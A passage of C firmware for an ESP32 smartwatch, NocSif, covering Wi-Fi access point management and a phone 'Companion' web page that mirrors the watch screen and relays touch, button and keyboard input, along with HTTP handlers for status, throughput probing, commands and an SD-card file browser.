 * if_key "WIFI_AP_DEF": calling esp_netif_create_default_wifi_ap() a second time makes esp_netif_new()
 * return NULL ("duplicate key") and the IDF wrapper assert-aborts (panic) BEFORE it can return the NULL
 * our callers check for. Three places raise an AP on the single radio — the software AP (do_ap_on), the
 * companion mirror (companion_ap_up), and the travel-router gateway (gateway.c ap_up) — and each tracked
 * the netif in its OWN static, so whichever came up second (e.g. gateway share up, then the companion
 * mirror) hit the assert. Look the existing netif up first and reuse it; only create when nothing holds
 * it yet, so create_default_wifi_ap() is never called against an existing one. Returns NULL only if a
 * genuine create fails. */
static esp_netif_t *ap_netif_acquire(void)
{
    esp_netif_t *existing = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    return existing ? existing : esp_netif_create_default_wifi_ap();
}

static void do_ap_on(void)
{
    if (nocsif_reliability_safe_mode()) {
        return;
    }
    if (!bring_up()) {
        return;
    }
    ap_cfg_ensure_loaded();

    if (s_ap_active) {                                /* already up: do a live reconfigure instead */
        apply_ap_config();
        ESP_LOGI(TAG, "software AP reconfigured (ch %d %s)",
                 s_ap_channel, s_ap_hidden ? "hidden" : "visible");
        refresh_strings();
        return;
    }

    /* with only one radio: suspends capture plus the STA link, remembering it so Stop can restore it later */
    s_ap_prev_connected = s_connected;
    monitor_teardown();
    s_want_connect = false;                           /* the disconnect handler must not retry after this */
    if (s_connected || s_sta_started) {
        esp_wifi_disconnect();
    }
    s_connected = false;
    s_join_state = NOCSIF_WIFI_JOIN_IDLE;
    clear_netinfo();

    if (s_ap_netif == NULL) {
        s_ap_netif = ap_netif_acquire();                   /* reuse the singleton AP netif if one exists */
        if (s_ap_netif == NULL) {
            ESP_LOGE(TAG, "create_default_wifi_ap failed");
            publish_status("err");
            publish_detail("AP init failed.");
            return;
        }
    }

    if (s_sta_started) {
        esp_wifi_stop();                              /* a clean mode switch; the STA_STOP event follows */
        s_sta_started = false;
    }
    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_mode(WIFI_MODE_AP));
    apply_ap_config();

    esp_err_t e = esp_wifi_start();
    if (e != ESP_OK) {
        ESP_LOGE(TAG, "esp_wifi_start (AP): %s", esp_err_to_name(e));
        publish_status("err");
        publish_detail("AP failed to start.");
        esp_wifi_set_mode(WIFI_MODE_STA);             /* leave a sane mode behind on any exit path */
        return;
    }

    uint8_t apmac[6];                                 /* the AP's own MAC and gateway IP, for the readout */
    if (esp_wifi_get_mac(WIFI_IF_AP, apmac) == ESP_OK) {
        char s[18];
        format_mac(s, sizeof s, apmac);
        publish_mac_str(s);
    }
    esp_netif_ip_info_t ipinfo;
    if (esp_netif_get_ip_info(s_ap_netif, &ipinfo) == ESP_OK) {
        snprintf(s_ap_ip, sizeof s_ap_ip, IPSTR, IP2STR(&ipinfo.ip));
    }

    s_ap_cli_cnt[0] = s_ap_cli_cnt[1] = 0;            /* starts with an empty client list */
    s_ap_cli_i = 0;
    s_ap_cli_gen++;
    if (s_ap_timer == NULL) {
        const esp_timer_create_args_t ta = { .callback = ap_tick, .name = "wifiap" };
        ESP_ERROR_CHECK_WITHOUT_ABORT(esp_timer_create(&ta, &s_ap_timer));
    }
    if (s_ap_timer) {
        esp_timer_start_periodic(s_ap_timer, 750000);  /* a 750ms client-list refresh cadence */
    }

    s_ap_active = true;
    s_enabled = true;
    ESP_LOGW(TAG, "software AP ON: \"%s\" ch %d %s (max %d) ip %s; int-dma free=%u",
             s_ap_ssid, s_ap_channel, s_ap_hidden ? "hidden" : "visible",
             s_ap_maxconn, s_ap_ip[0] ? s_ap_ip : "?",
             (unsigned)nocsif_int_dma_free());
    refresh_strings();
}

static void do_ap_off(void)
{
    if (!s_ap_active) {
        return;
    }
    bool rejoin = s_ap_prev_connected && s_ssid[0] && s_autojoin;
    ap_teardown();                                    /* the radio is now stopped, in STA mode */
    s_want_connect = rejoin;
    if (rejoin) {
        s_retry = 0;
        s_auth_fail = false;
        s_join_state = NOCSIF_WIFI_JOIN_JOINING;
        apply_config();
    }
    ensure_started();                                 /* STA_START fires, and try_connect() runs if a link is still wanted */
    if (s_sta_started && rejoin) {
        try_connect();
    }
    refresh_strings();
}

/* ============================ §4.8a Companion control surface (L4) — P1 ==================== *
 * Reuses the shipped software-AP bring-up (open AP; s_ap_ssid_ov gives it a device-name SSID, honoured
 * by apply_ap_config) and layers an mDNS responder + a routed HTTP server (its own handle) on top —
 * the same "ride on the AP" pattern the captive portal uses, but owner-scope and mutually exclusive
 * with the portal. Bluetooth is NOT touched (the controller is resident since RAM Phase 2, so the
 * surface coexists with the phone link); here we log heap health and fail safe if the AP or HTTP
 * can't start. The HTTP server task runs on a PSRAM stack (P4): an internal stack alive across a
 * sustained WiFi transfer competes with WiFi's dynamic RX buffers for the same scarce pool (the §4.10
 * download lesson), and the /sd file browser streams multi-MB files through this task. */

/* §4.8a Companion — the phone page. Redesigned to ONE thing: a full-screen, low-latency live mirror of
 * the watch (JPEG frames over /ws), with a hamburger (Blank / Wake / Reset), the two side buttons
 * (FN · PWR), and the phone keyboard raised when a watch text field is focused. Everything the old page
 * had (dashboard, menu tree, CC toggles, sliders, file browser) is gone — this is the live control. */
static const char COMP_PAGE_HTML[] =
"<!DOCTYPE html><html lang='en'><head><meta charset='utf-8'>"
"<meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover'>"
"<meta name='apple-mobile-web-app-capable' content='yes'>"
"<meta name='apple-mobile-web-app-status-bar-style' content='black-translucent'>"
"<meta name='apple-mobile-web-app-title' content='NocSif'>"
"<meta name='theme-color' content='#0b0b0d'>"
"<title>NocSif Web control</title><style>"
":root{--bg:#0b0b0d;--panel:#141418;--edge:#2a2a31;--ink:#c9c9cf;--dim:#8c8c92;--accent:#8b7bd8}"
"*{box-sizing:border-box}html,body{margin:0;height:100%}"
"body{background:var(--bg);color:var(--ink);font-family:ui-monospace,Menlo,Consolas,monospace;"
"-webkit-font-smoothing:antialiased;touch-action:none;-webkit-user-select:none;user-select:none;"
"-webkit-tap-highlight-color:transparent;display:flex;flex-direction:column;overflow:hidden}"
"header{display:flex;align-items:center;gap:10px;padding:10px 14px;padding-top:max(10px,env(safe-area-inset-top))}"
"header .t{flex:1;font-family:Georgia,'Times New Roman',serif;font-size:19px;color:#e6e6ea;letter-spacing:.5px}"
".dot{width:9px;height:9px;border-radius:50%;background:var(--accent);box-shadow:0 0 8px var(--accent);flex:none}"
".dot.off{background:#555;box-shadow:none}"
".ham{background:none;border:0;color:var(--ink);font-size:23px;line-height:1;padding:4px 8px;cursor:pointer}"
"main{flex:1;display:flex;align-items:center;justify-content:center;padding:4px 12px;min-height:0}"
"#mir{height:100%;width:auto;max-width:100%;aspect-ratio:205/251;border-radius:16px;background:#000;"
"box-shadow:0 0 0 1px var(--edge);touch-action:none;display:block}"
".tp{position:fixed;width:34px;height:34px;margin:-17px 0 0 -17px;border-radius:50%;border:2px solid var(--accent);"
"background:rgba(139,123,216,.18);pointer-events:none;z-index:9;animation:tp .32s ease-out forwards}"
"@keyframes tp{from{transform:scale(.55);opacity:.9}to{transform:scale(1.5);opacity:0}}"
".sbtns{display:flex;gap:12px;padding:12px 16px;padding-bottom:max(12px,env(safe-area-inset-bottom))}"
".sbtn{flex:1;background:#1b1b21;border:1px solid var(--edge);border-radius:12px;color:var(--ink);"
"font:inherit;font-size:15px;letter-spacing:.5px;padding:16px 6px;cursor:pointer}"
".sbtn:active{border-color:var(--accent);color:#fff;background:#241f38}"
".scrim{position:fixed;inset:0;background:rgba(0,0,0,.6);display:none;z-index:20}.scrim.show{display:block}"
".draw{position:fixed;top:0;right:0;bottom:0;width:76%;max-width:320px;background:var(--panel);"
"border-left:1px solid var(--edge);transform:translateX(100%);transition:transform .18s ease;z-index:21;"
"padding:max(18px,env(safe-area-inset-top)) 16px max(16px,env(safe-area-inset-bottom));display:flex;"
"flex-direction:column;gap:10px}.draw.show{transform:none}"
".draw h2{font-family:Georgia,serif;font-size:16px;color:#e6e6ea;margin:2px 0 8px;letter-spacing:.5px}"
".dbtn{background:#1b1b21;border:1px solid var(--edge);border-radius:10px;color:var(--ink);font:inherit;"
"font-size:15px;padding:14px;text-align:left;cursor:pointer}.dbtn:active{border-color:var(--accent);color:#fff}"
".dbtn.on{border-color:var(--accent);color:#fff;background:#241f38}"
".dhint{color:var(--dim);font-size:11px;margin-top:auto;line-height:1.6}"
"#kbar{position:fixed;left:0;right:0;bottom:0;background:#191922;border-top:1px solid var(--accent);"
"padding:12px 16px;padding-bottom:max(12px,env(safe-area-inset-bottom));display:none;align-items:center;"
"justify-content:space-between;gap:10px;font-size:13px;z-index:30}#kbar.show{display:flex}"
"#kbtap{flex:1;text-align:left}#kbar button{background:#2a2a31;border:0;color:var(--ink);border-radius:8px;padding:9px 13px;font:inherit}"
"#kb{position:absolute;left:-9999px;top:0;width:1px;height:1px;opacity:0}"
"</style></head><body>"
"<header><button class='ham' id='ham' aria-label='menu'>\xE2\x98\xB0</button>"
"<span class='t'>NocSif</span><span class='dot off' id='dot'></span></header>"
"<main><canvas id='mir' width='410' height='502'></canvas></main>"
"<div class='sbtns'><button class='sbtn' id='btnfn'>FN</button><button class='sbtn' id='btnpwr'>PWR</button></div>"
"<div class='scrim' id='scrim'></div>"
"<div class='draw' id='draw'><h2>Watch</h2>"
"<button class='dbtn' id='mblank'>Blank watch screen</button>"
"<button class='dbtn' id='mwake'>Wake watch</button>"
"<button class='dbtn' id='mreset'>Reset watch</button>"
"<div class='dhint'>Blank turns the watch panel off so the phone is the display \xC2\xB7 Wake lights it back up "
"\xC2\xB7 Reset reboots the watch. This page is served by the watch's Companion on its own hotspot and on its "
"Wi-Fi link; the watch keeps its Wi-Fi link and Bluetooth as they are. \xC2\xB7 owner use \xC2\xB7 authorized testing only</div></div>"
"<div id='kbar'><span id='kbtap'>watch text field \xE2\x80\x94 tap to type</span><button id='kbx'>close</button></div>"
"<input id='kb' autocapitalize='off' autocomplete='off' autocorrect='off' spellcheck='false'>"
"<script>"
"var $=function(id){return document.getElementById(id);};"
"var cv=$('mir'),ctx=cv.getContext('2d'),W=410,H=502;"   /* watch native px for touch mapping */
"function post(p,b){try{fetch(p,{method:'POST',headers:{'Content-Type':'application/json'},"
"body:b?JSON.stringify(b):null});}catch(e){}}"
"var ws,poll;"
"function online(o){$('dot').classList.toggle('off',!o);}"
"function wsSend(o){try{if(ws&&ws.readyState===1)ws.send(JSON.stringify(o));}catch(e){}}"
/* binary /ws frame = 'N','P',ver,0,x0(u16 LE),y0(u16 LE) + a JPEG of the rectangle that changed; paint it
 * in place on the full-size canvas (a full frame is just a rectangle at 0,0 covering everything). Frames
 * are decoded in arrival order so a later rect never lands under an earlier one. */
"var fq=Promise.resolve();"
/* 'N','Q' frame = lossless RGB565 tiles (the default codec; format + reference coder in wifi.c above
 * mir_encode_nq and tools/nocsif_bridge/nq_codec.py). Decoded straight into a persistent RGBA ImageData
 * (a 64K-entry 565 -> RGBA table), then only the changed bounding box is put on the canvas. */
"var img=null,p32=null,lut=null;"
"function nqInit(w,h){img=ctx.createImageData(w,h);p32=new Uint32Array(img.data.buffer);p32.fill(0xFF000000);"
"if(!lut){lut=new Uint32Array(65536);for(var v=0;v<65536;v++){var r=v>>11,g=(v>>5)&63,b=v&31;"
"lut[v]=(0xFF000000|((b<<3|b>>2)<<16)|((g<<2|g>>4)<<8)|(r<<3|r>>2))>>>0;}}}"
"function drawNQ(buf){var u=new Uint8Array(buf),dv=new DataView(buf);"
"var w=dv.getUint16(4,true),h=dv.getUint16(6,true),tw=u[8],th=u[9],tc=u[10],sl=dv.getUint32(12,true);"
"if(!img||img.width!==w||img.height!==h)nqInit(w,h);"
"var lo=dv.getUint32(16,true),hi=dv.getUint32(20,true),o=24,rows=[];"
"for(var ty=0;ty<64;ty++){if((ty<32?lo>>>ty:hi>>>(ty-32))&1){rows.push(ty,dv.getUint32(o,true));o+=4;}}"
"var i=o,ix=new Uint16Array(64),pv=0,run=0,X0=w,Y0=h,X1=0,Y1=0;"
"for(var k=0;k<rows.length;k+=2){var ry=rows[k],cm=rows[k+1],tx=0;"
"while(tx<tc){if(!((cm>>>tx)&1)){tx++;continue;}var c0=tx;while(tx<tc&&((cm>>>tx)&1))tx++;"
"var x0=c0*tw,x1=Math.min(w,tx*tw),y0=ry*th,y1=Math.min(h,y0+th);"
"if(x0<X0)X0=x0;if(y0<Y0)Y0=y0;if(x1>X1)X1=x1;if(y1>Y1)Y1=y1;"
"for(var y=y0;y<y1;y++){var q=y*w;for(var x=x0;x<x1;x++){"
"if(run){run--;}else{var c=u[i++];"
"if(c<64){pv=ix[c];}"
"else if(c<128){pv=((((pv>>11)+((c>>4)&3)-2)&31)<<11)|(((((pv>>5)&63)+((c>>2)&3)-2)&63)<<5)|(((pv&31)+(c&3)-2)&31);ix[((pv>>11)*3+((pv>>5)&63)*5+(pv&31)*7)&63]=pv;}"
"else if(c<192){var dg=(c&63)-32,c2=u[i++],hg=dg>>1;"
"pv=((((pv>>11)+(c2>>4)-8+hg)&31)<<11)|(((((pv>>5)&63)+dg)&63)<<5)|(((pv&31)+(c2&15)-8+hg)&31);ix[((pv>>11)*3+((pv>>5)&63)*5+(pv&31)*7)&63]=pv;}"
"else if(c<253){run=c-192;}"
"else if(c===253){run=61+u[i++];}"
"else{pv=u[i]|(u[i+1]<<8);i+=2;ix[((pv>>11)*3+((pv>>5)&63)*5+(pv&31)*7)&63]=pv;}}"
"p32[q+x]=lut[pv];}}}}"
"if(X1>X0)ctx.putImageData(img,0,0,X0,Y0,X1-X0,Y1-Y0);}"
"function drawFrame(buf){if(buf.byteLength>=24){var h4=new Uint8Array(buf,0,2);"
"if(h4[0]===78&&h4[1]===81){fq=fq.then(function(){drawNQ(buf);}).catch(function(){});return;}}"
"try{var u=new Uint8Array(buf),o=0,parts=[];"
"while(o+16<=u.length&&u[o]===78&&u[o+1]===80){var n=u[o+8]|(u[o+9]<<8)|(u[o+10]<<16)|(u[o+11]<<24);"
"parts.push({x:u[o+4]|(u[o+5]<<8),y:u[o+6]|(u[o+7]<<8),b:buf.slice(o+16,o+16+n)});o=(o+16+n+15)&~15;}"
"if(!parts.length)parts.push({x:0,y:0,b:buf});"
"fq=fq.then(function(){return Promise.all(parts.map(function(p){return createImageBitmap(new Blob([p.b],{type:'image/jpeg'}));}))"
".then(function(bms){for(var i=0;i<bms.length;i++){ctx.drawImage(bms[i],parts[i].x,parts[i].y);if(bms[i].close)bms[i].close();}});})"
".catch(function(){});}catch(e){}}"
"var lastFocus=false;"
"function apply(j){online(true);"
"if(j.accent)document.documentElement.style.setProperty('--accent','#'+j.accent);"
"$('mblank').classList.toggle('on',!!j.blank);"
"if(j.focused&&!lastFocus){$('kbar').classList.add('show');}"
"if(!j.focused&&lastFocus){$('kbar').classList.remove('show');$('kb').blur();}"
"lastFocus=!!j.focused;}"
"function startWs(){try{ws=new WebSocket('ws://'+location.host+'/ws');ws.binaryType='arraybuffer';"
"ws.onopen=function(){online(true);if(poll){clearInterval(poll);poll=null;}};"
/* keepalive every 150 ms: steady uplink traffic keeps the phone's WiFi out of power-save, which is what
 * turns a 6 KB frame into a 1-2 s stall on an otherwise fast link */
"if(!window.ka){window.ka=setInterval(function(){wsSend({t:'k'});},150);}"
"ws.onmessage=function(ev){if(typeof ev.data==='string'){try{apply(JSON.parse(ev.data));}catch(e){}}"
"else{drawFrame(ev.data);}};"
"ws.onclose=function(){online(false);startPoll();setTimeout(startWs,2000);};"
"ws.onerror=function(){try{ws.close();}catch(e){}};}catch(e){startPoll();}}"
"function startPoll(){if(poll)return;poll=setInterval(function(){"
"fetch('/api/ping',{cache:'no-store'}).then(function(r){return r.json();})"
".then(function(j){apply(j);}).catch(function(){online(false);});},2000);}"
/* touch: map a pointer on the canvas to watch-native px and stream it as the remote pointer */
"function txy(e){var r=cv.getBoundingClientRect();var x=(e.clientX-r.left)/r.width*W,y=(e.clientY-r.top)/r.height*H;"
"x=x<0?0:x>W-1?W-1:x|0;y=y<0?0:y>H-1?H-1:y|0;return{x:x,y:y};}"
"var drag=false,tLast=0;"
/* local tap feedback: a ring at the finger the instant it lands — the real picture follows when the watch
 * has rendered it (~0.2-0.4 s for a screen change), so the tap never feels ignored. Removed after 300 ms. */
"function fx(e){var d=document.createElement('div');d.className='tp';d.style.left=e.clientX+'px';d.style.top=e.clientY+'px';"
"document.body.appendChild(d);setTimeout(function(){if(d.parentNode)d.parentNode.removeChild(d);},320);}"
"cv.addEventListener('pointerdown',function(e){e.preventDefault();drag=true;fx(e);"
"try{cv.setPointerCapture(e.pointerId);}catch(x){}var p=txy(e);wsSend({t:'m',x:p.x,y:p.y,s:1});});"
"cv.addEventListener('pointermove',function(e){if(!drag)return;var n=Date.now();if(n-tLast<25)return;tLast=n;"
"var p=txy(e);wsSend({t:'m',x:p.x,y:p.y,s:1});});"
"cv.addEventListener('pointerup',function(e){if(!drag)return;drag=false;var p=txy(e);wsSend({t:'m',x:p.x,y:p.y,s:0});});"
"cv.addEventListener('pointercancel',function(e){if(!drag)return;drag=false;var p=txy(e);wsSend({t:'m',x:p.x,y:p.y,s:0});});"
/* side buttons: short tap or 500 ms long-press */
"function wireBtn(id,k){var el=$(id),tmr=null,lng=false;"
"el.addEventListener('pointerdown',function(e){e.preventDefault();lng=false;"
"tmr=setTimeout(function(){lng=true;wsSend({t:'b',k:k,a:'l'});},500);});"
"el.addEventListener('pointerup',function(){if(tmr){clearTimeout(tmr);tmr=null;}if(!lng)wsSend({t:'b',k:k,a:'s'});lng=false;});"
"el.addEventListener('pointerleave',function(){if(tmr){clearTimeout(tmr);tmr=null;}});}"
"wireBtn('btnfn','fn');wireBtn('btnpwr','pwr');"
/* hamburger drawer */
"function drw(o){$('draw').classList.toggle('show',o);$('scrim').classList.toggle('show',o);}"
"$('ham').onclick=function(){drw(true);};$('scrim').onclick=function(){drw(false);};"
"$('mblank').onclick=function(){var on=!$('mblank').classList.contains('on');"
"$('mblank').classList.toggle('on',on);wsSend({t:'c',on:on?1:0});};"
"$('mwake').onclick=function(){wsSend({t:'w'});drw(false);};"
"$('mreset').onclick=function(){if(confirm('Reboot the watch now?')){wsSend({t:'r'});drw(false);}};"
/* keyboard: the watch reports a focused text field; tap to raise the phone keyboard, type over /api/type */
"var kb=$('kb');"
"$('kbtap').onclick=function(){kb.focus();};"
"$('kbx').onclick=function(){kb.blur();$('kbar').classList.remove('show');};"
"kb.addEventListener('input',function(e){if(e.data){post('/api/type',{text:e.data});}kb.value='';});"
"kb.addEventListener('keydown',function(e){"
"if(e.key==='Enter'){e.preventDefault();post('/api/key',{key:'enter'});}"
"else if(e.key==='Backspace'){e.preventDefault();post('/api/key',{key:'backspace'});}});"
"startWs();startPoll();"
"</script></body></html>";

static esp_err_t comp_root_get(httpd_req_t *req)
{
    httpd_resp_set_type(req, "text/html");
    return httpd_resp_send(req, COMP_PAGE_HTML, HTTPD_RESP_USE_STRLEN);
}

/* Downlink probe: GET /api/blob?n=<bytes> (default 256 KB, max 2 MB) streams a pattern from PSRAM in 8 KB
 * chunks and the WATCH logs the elapsed time and KB/s of its own sends — a link-throughput number that
 * does not depend on the phone's clock. The live mirror is a stream of ~40-60 KB frames over this same
 * socket path, so this is the figure that decides whether a frame fits inside the send-wait. */
static esp_err_t comp_blob_get(httpd_req_t *req)
{
    size_t n = 256 * 1024;
    char q[32], v[16];
    if (httpd_req_get_url_query_str(req, q, sizeof q) == ESP_OK &&
        httpd_query_key_value(q, "n", v, sizeof v) == ESP_OK) {
        long want = atol(v);
        if (want > 0 && want <= 2 * 1024 * 1024) n = (size_t)want;
    }
    enum { CHUNK = 8192 };
    uint8_t *buf = heap_caps_malloc(CHUNK, MALLOC_CAP_SPIRAM);
    if (!buf) { httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "no mem"); return ESP_FAIL; }
    for (int i = 0; i < CHUNK; i++) buf[i] = (uint8_t)(i * 7 + 13);
    httpd_resp_set_type(req, "application/octet-stream");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    const int64_t t0 = esp_timer_get_time();
    size_t sent = 0;
    esp_err_t r = ESP_OK;
    while (sent < n && r == ESP_OK) {
        size_t k = (n - sent < CHUNK) ? (n - sent) : CHUNK;
        r = httpd_resp_send_chunk(req, (const char *)buf, k);
        if (r == ESP_OK) sent += k;
    }
    if (r == ESP_OK) r = httpd_resp_send_chunk(req, NULL, 0);
    const uint32_t ms = (uint32_t)((esp_timer_get_time() - t0) / 1000);
    ESP_LOGW(TAG, "companion: blob %u B in %u ms = %u KB/s (%s); int-dma largest %u",
             (unsigned)sent, (unsigned)ms, (unsigned)(ms ? (sent * 1000ull / 1024) / ms : 0),
             (r == ESP_OK) ? "ok" : esp_err_to_name(r),
             (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_INTERNAL | MALLOC_CAP_DMA));
    heap_caps_free(buf);
    return r;
}

static esp_err_t comp_ping_get(httpd_req_t *req)
{
    char js[512];
    httpd_resp_set_type(req, "application/json");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    if (s_comp_state_fn) {                 /* P3: the full live-state snapshot, in the same shape as /ws sends */
        js[0] = '\0';
        s_comp_state_fn(js, sizeof js);
        if (js[0]) return httpd_resp_sendstr(req, js);
    }
    int n = snprintf(js, sizeof js,        /* a fallback used before the UI has registered its own state provider */
                     "{\"name\":\"%s\",\"batt\":%d,\"uptime\":%lld,\"clients\":%d}",
                     nocsif_settings_device_name(), nocsif_power_batt_pct(),
                     (long long)(esp_timer_get_time() / 1000000),
                     s_ap_active ? nocsif_wifi_ap_client_count() : 0);
    return httpd_resp_send(req, js, n);
}

/* ---- P2 command channel: phone to watch ---- *
 * Each POST handler runs on the httpd task: it reads the small JSON body,
 * fills a nocsif_companion_cmd_t, and forwards it to the UI-registered
 * handler, which marshals the actual work onto the LVGL task. Every one of
 * these is fire-and-forget — the reply {"ok":true} goes out immediately —
 * and none of them touch LVGL directly here. Every command is logged with
 * ESP_LOGI, which the reliability A2 log tee records into the persistent
 * logbook ring. */
static esp_err_t comp_read_body(httpd_req_t *req, char *buf, size_t len)
{
    int total = req->content_len;
    if (total < 0) total = 0;
    if ((size_t)total >= len) total = (int)len - 1;
    int got = 0;
    while (got < total) {
        int r = httpd_req_recv(req, buf + got, total - got);
        if (r == HTTPD_SOCK_ERR_TIMEOUT) continue;
        if (r <= 0) break;
        got += r;
    }
    buf[got] = '\0';
    return ESP_OK;
}

static esp_err_t comp_reply(httpd_req_t *req, bool ok)
{
    if (!ok) httpd_resp_set_status(req, "400 Bad Request");
    httpd_resp_set_type(req, "application/json");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    return httpd_resp_sendstr(req, ok ? "{\"ok\":true}" : "{\"ok\":false}");
}

/* Extracts a string field from a JSON body into `out`. Returns false if it's absent or not a string. */
static bool comp_json_str(const char *body, const char *key, char *out, size_t len)
{
    bool ok = false;
    cJSON *root = cJSON_Parse(body);
    if (root) {
        cJSON *it = cJSON_GetObjectItem(root, key);
        if (cJSON_IsString(it) && it->valuestring) {
            snprintf(out, len, "%s", it->valuestring);
            ok = true;
        }
        cJSON_Delete(root);
    }
    return ok;
}

/* Extracts an integer field, accepting either a JSON number or a numeric string, into *out. */
static bool comp_json_int(const char *body, const char *key, int *out)
{
    bool ok = false;
    cJSON *root = cJSON_Parse(body);
    if (root) {
        cJSON *it = cJSON_GetObjectItem(root, key);
        if (cJSON_IsNumber(it))                       { *out = (int)it->valuedouble; ok = true; }
        else if (cJSON_IsString(it) && it->valuestring){ *out = atoi(it->valuestring); ok = true; }
        cJSON_Delete(root);
    }
    return ok;
}

/* Fills a command and hands it off to the UI, if a handler is registered and the companion is up. */
static void comp_dispatch(nocsif_companion_cmd_type_t type, const char *arg)
{
    nocsif_companion_cmd_t cmd = { .type = type };
    if (arg) snprintf(cmd.arg, sizeof cmd.arg, "%s", arg);
    ESP_LOGI(TAG, "companion cmd: type=%d arg=\"%s\"", (int)type, cmd.arg);
    s_mir_input_us = esp_timer_get_time();
    if (s_comp_active && s_comp_cmd_fn) {
        s_comp_cmd_fn(&cmd);
    }
}

static esp_err_t comp_launch_post(httpd_req_t *req)
{
    char body[256]; comp_read_body(req, body, sizeof body);
    char id[96];
    if (!comp_json_str(body, "id", id, sizeof id)) return comp_reply(req, false);
    comp_dispatch(NOCSIF_COMPANION_CMD_LAUNCH, id);
    return comp_reply(req, true);
}

static esp_err_t comp_type_post(httpd_req_t *req)
{
    char body[256]; comp_read_body(req, body, sizeof body);
    char text[192];
    if (!comp_json_str(body, "text", text, sizeof text)) return comp_reply(req, false);
    comp_dispatch(NOCSIF_COMPANION_CMD_TYPE, text);
    return comp_reply(req, true);
}

static esp_err_t comp_key_post(httpd_req_t *req)
{
    char body[128]; comp_read_body(req, body, sizeof body);
    char key[24];
    if (!comp_json_str(body, "key", key, sizeof key)) return comp_reply(req, false);
    comp_dispatch(NOCSIF_COMPANION_CMD_KEY, key);
    return comp_reply(req, true);
}

static esp_err_t comp_back_post(httpd_req_t *req)
{
    comp_dispatch(NOCSIF_COMPANION_CMD_BACK, NULL);
    return comp_reply(req, true);
}

static esp_err_t comp_home_post(httpd_req_t *req)
{
    comp_dispatch(NOCSIF_COMPANION_CMD_HOME, NULL);
    return comp_reply(req, true);
}

/* Both sliders carry a 0-255 level, dispatched as a decimal string; the async UI side clamps it. */
static esp_err_t comp_level_post(httpd_req_t *req, nocsif_companion_cmd_type_t type)
{
    char body[64]; comp_read_body(req, body, sizeof body);
    int v;
    if (!comp_json_int(body, "v", &v)) return comp_reply(req, false);
    if (v < 0) v = 0; if (v > 255) v = 255;
    char arg[8]; snprintf(arg, sizeof arg, "%d", v);
    comp_dispatch(type, arg);
    return comp_reply(req, true);
}
static esp_err_t comp_brightness_post(httpd_req_t *req) { return comp_level_post(req, NOCSIF_COMPANION_CMD_BRIGHTNESS); }
static esp_err_t comp_volume_post(httpd_req_t *req)     { return comp_level_post(req, NOCSIF_COMPANION_CMD_VOLUME); }

/* GET /api/menu returns the watch's live menu tree: the 3 Home
 * categories and their actual rows. The UI fills in the JSON from its own
 * screen registry, immutable after init, so the page always mirrors the
 * real device rather than a hardcoded grid. Sent from a heap buffer with no
 * chunking involved, since the whole tree is only around 1.5 KB. */
static esp_err_t comp_menu_get(httpd_req_t *req)
{
    httpd_resp_set_type(req, "application/json");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    if (!s_comp_menu_fn) return httpd_resp_sendstr(req, "{\"cats\":[]}");
    enum { COMP_MENU_BUF = 8192 };   /* the full nested map, roughly 100 nodes, fits comfortably with headroom to spare */
    char *js = malloc(COMP_MENU_BUF);
    if (!js) return httpd_resp_send_500(req);
    js[0] = '\0';
    s_comp_menu_fn(js, COMP_MENU_BUF);
    esp_err_t r = httpd_resp_sendstr(req, js);
    free(js);
    return r;
}

/* ---- P4 /sd file browser: implements PLAN section 4.8's "wireless
 * file download from SD" ---- *
 *   GET  /api/fs?p=<dir>             returns JSON {path, ents:[{n,d,s}], trunc};
 *                                     directories listed first, dotfiles hidden
 *   GET  /api/file?p=<file>          streams the file, chunked, with
 *                                     Content-Disposition attachment and X-File-Size
 *   POST /api/upload?p=<dir>&n=<nm>  writes the raw body to <dir>/<nm> (via a
 *                                     .part file, renamed once complete)
 *   POST /api/delete {"p":<file>}    removes exactly one regular file, never a directory
 * All of these run on the httpd task (a PSRAM stack — see
 * companion_httpd_up). Card access rules mirror the on-watch Files screen
 * and the section 4.10 download lesson: the card is claimed for the
 * request (refused with a reason while File Share has the drive), the FAT
 * lock is only taken around each readdir call or 8 KB chunk so the rest of
 * the watch keeps its own short card accesses working, and the lock is
 * never held across a socket send. Paths are jailed to /sd: must be
 * absolute, no "." or ".." segment, no empty segment, no control characters
 * or backslashes, and length-capped. Mirror frames simply queue behind an
 * in-progress transfer on the single httpd task and resume after it — this
 * is expected behavior. Section 4.15: the jail, claim, and listing rules
 * moved into sdfs.{h,c} so the desktop bridge can share them too. */
#define COMP_FS_CHUNK     8192                  /* the read/write unit used under one short card lock */

static esp_err_t comp_fs_err(httpd_req_t *req, const char *status, const char *msg)
{
    httpd_resp_set_status(req, status);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    char js[160];
    snprintf(js, sizeof js, "{\"err\":\"%s\"}", msg);
    return httpd_resp_sendstr(req, js);
}

/* Decodes a query-string value (%XX escapes and '+'). Returns false if the decoded result wouldn't fit. */
static bool comp_url_decode(const char *in, char *out, size_t len)
{
    size_t o = 0;
    for (const char *p = in; *p; p++) {
        char c = *p;
        if (c == '+') {
            c = ' ';
        } else if (c == '%' && isxdigit((unsigned char)p[1]) && isxdigit((unsigned char)p[2])) {
            char hex[3] = { p[1], p[2], 0 };
            c = (char)strtol(hex, NULL, 16);
            p += 2;
        }
        if (o + 1 >= len) return false;
        out[o++] = c;
    }
    out[o] = '\0';
    return true;
}

/* One decoded query value. Returns false if it's absent, gets truncated, or is too long for `out`. */
static bool comp_query(httpd_req_t *req, const char *key, char *out, size_t len)
{
    char q[CONFIG_HTTPD_MAX_URI_LEN + 1];
    char enc[CONFIG_HTTPD_MAX_URI_LEN + 1];
    if (httpd_req_get_url_query_str(req, q, sizeof q) != ESP_OK) return false;
    if (httpd_query_key_value(q, key, enc, sizeof enc) != ESP_OK) return false;
    return comp_url_decode(enc, out, len);
}

static void comp_json_escape(const char *in, char *out, size_t len)
{
    size_t o = 0;
    for (; *in && o + 2 < len; in++) {
        unsigned char c = (unsigned char)*in;
        if (c == '"' || c == '\\') { out[o++] = '\\'; out[o++] = (char)c; }
        else if (c < 0x20)         { out[o++] = ' '; }
